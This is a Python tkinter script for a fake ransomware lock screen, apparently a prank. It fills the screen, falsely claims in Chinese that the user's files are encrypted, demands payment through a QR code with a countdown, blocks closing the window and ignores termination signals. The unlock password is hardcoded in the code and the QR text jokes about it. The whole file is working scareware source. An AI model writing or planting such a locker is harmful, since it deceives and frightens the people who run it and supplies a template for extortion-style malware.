import tkinter as tk
import qrcode as qc
import signal


def full_and_top():
    root.focus_force()
    entry.focus_force()
    root.attributes('-fullscreen', True)
    root.after(100, full_and_top)


def password_ok(event):
    if entry.get() == 'bu gao su ni':
        status.set('密码正确!按ESC退出')
        root.bind('<Escape>', lambda event: root.destroy())
    else:
        status.set('密码错误!')
        entry.delete(0, tk.END)
        root.after(500, lambda: status.set(''))


def time_minus_one():
    give_money_time.set(give_money_time.get() - 1)
    root.after(1000, time_minus_one)


root = tk.Tk()
root.title('你的电脑已锁定!')
root.configure(bg='#c80000')
status = tk.StringVar(value='')
give_money_time = tk.IntVar(value=1800)

tk.Label(root, text='你的电脑已被锁定!', fg='white', bg='#640000', anchor=tk.NW, font=('Arial', 50)).pack(padx=10, pady=10, fill=tk.X)
text = tk.Text(root, height=10, width=50, bg='#640000', font=('Arial', 20))
text.pack(anchor=tk.NW, padx=10, pady=10, fill=tk.BOTH, expand=True)
lines = '你的文件已经被加密()并且电脑已经锁定了()()要想解锁, 需要输入一串密码()密码可以扫描二维码付费获取'.split('()')
for i in lines:
    text.insert(tk.END, i)
    text.insert(tk.END, '\n')
text.config(state=tk.DISABLED)
qr = qc.QRCode(box_size=3, error_correction=qc.constants.ERROR_CORRECT_H, border=2)
qr_data = 'give xxx 1000000 yuan [password:__________] Want to get the password without buying? password bu gao su ni  ^_^ hahaha'
qr.add_data(qr_data)
qr.make(fit=True)
img = qr.make_image(fill_color='white', back_color='#640000')
img.save('/tmp/kengren-bindu_give-money-qrcode.gif')
give_money_qrcode = tk.PhotoImage(file='/tmp/kengren-bindu_give-money-qrcode.gif')
tk.Label(root, image=give_money_qrcode, anchor=tk.W).pack(padx=10, pady=10, anchor=tk.W)
tk.Label(root, textvariable=give_money_time, anchor=tk.W, bg='#640000', font=('Arial', 30)).pack(padx=10, pady=10, anchor=tk.W)
entry = tk.Entry(root, font=('Arial', 30))
entry.pack(padx=10, pady=10, anchor=tk.W, fill=tk.X)
entry.insert(tk.END, '密码')
entry.bind('<Return>', password_ok)
tk.Label(root, textvariable=status, font=('Arial', 20), bg='#640000').pack(padx=10, pady=10, anchor=tk.W, fill=tk.X)

root.after(100, full_and_top)
root.after(1000, time_minus_one)
root.protocol('WM_DELETE_WINDOW', lambda *args: None)
signal.signal(signal.SIGINT, lambda *args: None)
signal.signal(signal.SIGHUP, lambda *args: None)
signal.signal(signal.SIGTERM, lambda *args: None)
signal.signal(signal.SIGQUIT, lambda *args: None)
signal.signal(signal.SIGSEGV, lambda *args: None)
signal.signal(signal.SIGABRT, lambda *args: None)
signal.signal(signal.SIGFPE, lambda *args: None)
signal.signal(signal.SIGBUS, lambda *args: None)

root.focus_force()
root.mainloop()
